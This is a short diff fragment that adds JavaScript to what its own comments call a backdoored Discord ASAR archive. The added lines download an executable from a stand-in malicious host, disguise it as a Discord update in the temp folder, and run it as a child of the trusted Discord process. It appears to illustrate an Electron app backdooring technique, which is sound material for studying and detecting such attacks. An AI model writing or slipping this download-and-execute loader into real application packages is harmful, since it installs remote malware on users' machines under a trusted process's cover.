@@ -1,0 +1,6 @@
+// Inside the backdoored ASAR:
+const { execSync } = require('child_process');
+// Download payload (obfuscated as Discord update)
+execSync('curl -s https://cdn.malicious.example/update.exe -o %TEMP%/dsc_update.exe');
+// Execute as child of Discord.exe (trusted process)
+execSync('%TEMP%/dsc_update.exe');
